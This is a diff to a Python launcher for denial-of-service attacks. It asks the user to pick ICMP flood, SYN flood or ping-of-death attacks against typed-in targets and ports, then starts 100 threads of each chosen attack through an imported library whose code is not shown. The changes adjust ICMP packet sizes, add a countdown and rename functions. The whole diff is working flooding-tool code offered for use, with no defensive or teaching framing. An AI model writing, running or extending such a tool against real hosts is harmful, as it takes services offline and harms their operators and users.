@@ -4,6 +4,8 @@ import time
 import sys
 import os
 import test_lib as ty
+import platform
+import ping3
 
 choices = [1, 2, 3]
 Threads = []
@@ -11,9 +13,9 @@ Threads = []
 try:
     attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
     vector = input("target(targets):\n").split(" ") #target
-    bye = input("number of bytes: \n").encode() #packet size
-    port = input("chose an internet port (or ports) for the attack: (if the attack is an application layer attack just press enter)\n").split(" ")#network port(s)
- #   bytes = bytes(bye)
+    bye = input("number of bytes (in icmp u can't choose more than 64 bytes): \n" ).encode() #packet size
+    port = input("chose an internet port (or ports) for the attack: (not all types of attack need net port, if your type attack doesn't just press enter)\n").split(" ")#network port(s)
+ #  bytes = bytes(bye)
     
     if attack_type == choices[0]:
         volumeBaseAttack = ty.VolumeBasedAttack
@@ -26,7 +28,9 @@ try:
                 Threads.append(t)
                 t.start()
         else:
-            ICMP = volumeBaseAttack.icmp(vector, bye, port)
+            print("choosing icmp attack u can't send more than 64 bytes (8[header], 56[payloads]). \n Now u have 10 second for end the attack...")
+            time.sleep(10)
+            ICMP = volumeBaseAttack.icmp(vector, bye)
             for i in range(100):
                 t = th.Thread(target=ICMP, args=(i,))
                 Threads.append(t)
@@ -34,7 +38,7 @@ try:
 
     elif attack_type == choices[1]:
         protocolAttack = ty.ProtocolAttack
-        subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
+        subtype1 = int(input("Syn_flood(1) or pod(2)\n"))
         if subtype1 == 1:
             Syn_flood = protocolAttack.syn_flood(vector, bye, port)
             for i in range(100):
@@ -42,9 +46,9 @@ try:
                 Threads.append(t)
                 t.start()
         else:
-            pof = protocolAttack.pof(vector, bye, port)
+            pod = protocolAttack.pod(vector, bye, port)
             for i in range(100):
-                t = th.Thread(target=pof, args=(i,))
+                t = th.Thread(target=pod, args=(i,))
                 Threads.append(t)
                 t.start()
 
